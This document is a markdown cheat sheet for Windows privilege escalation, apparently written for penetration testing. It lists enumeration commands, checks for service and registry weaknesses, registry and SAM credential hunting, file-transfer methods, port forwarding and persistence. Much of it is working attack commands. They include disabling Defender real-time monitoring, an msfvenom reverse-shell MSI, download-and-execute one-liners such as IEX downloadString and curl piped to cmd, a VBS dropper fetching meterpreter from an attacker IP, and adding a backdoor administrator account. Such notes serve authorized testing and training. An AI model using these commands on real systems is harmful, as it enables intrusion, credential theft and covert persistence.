# Quick Enum    
## Command line
    systeminfo 
    whoami /priv
    ipconfig /all     
    net users   
    qwinsta    
    net localgroup    
    dir /r    
    tree /a /f  
    
    netstat /anto   
    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
    route print 
    arp -a   
    netsh firewall show state 
    netsh firewall show config
## Powershell
    Get-ExecutionPolicy    
    Set-ExecutionPolicy Unrestricted   
    Set-MpPreference -DisableRealtimeMonitoring $true   
    
## Scripts
[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)   

## Checklists    
[HackTricks Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

____   

# Manual Enum 
https://lolbas-project.github.io/#   
    
## Service Exploits 
    tasklist /svc 
    sc query 
    net start/stop service
### Unquoted Service Paths
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """   
### Weak Registry Permissions
### Insecure Service Executables 
    accesschk.exe -uwcqv "Everyone" *
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -uwcqv "Users" *
### Scheduled Tasks
    schtasks /query /fo LIST 2>nul | findstr TaskName
### DLL Search Order Hijacking

## Registry Exploits
### Autoruns
### AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
## Passwords
    findstr /si password *.xml *.ini *.txt *.config 2>nul
### Saved creds
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
    cmdkey /list
    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe
### Creds in Registry 
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
### SAM and SYSTEM Files
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system
## Kernel exploits   
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
### Tools
https://github.com/bitsadmin/wesng   
https://github.com/rasta-mouse/Watson   
### Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits   

____   


# File Transfer     
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
    copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe

    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
    
  
## Powershell
    powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
    powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
    powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
    
    IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

## VBS 
    echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

## XM File Creation (Using copy and paste)
    PS C:\> $console = [XML] @"
    <XML CODE CODE HERE>
    "@
    /# write the xml to file:
    PS C:\> $console.save("C:\users\burmat\documents\console.xml")
 ## Windows 10 - curl
    curl http://server/file -o file
    curl http://server/file.bat | cmd
 ____   
 # Port Forwarding
 Expose internal services, usually hidden due to firewall rules. 
 ## Plink
     [upload plink.exe]
     plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ## SSH (Window 10 and newer)
     [from target box to expose SMB ]
     ssh -l kali -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ____
 # Persistence
     net user USERNAME PASSWORD /add
     net localgroup Administrators USERNAME /add
     net localgroup "Remote Management Users" USERNAME /add
 ____
 
# Resources
## Cheat Sheets and Guides 
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts 
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ 
## Learn More
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/      
https://github.com/frizb/Windows-Privilege-Escalation
  
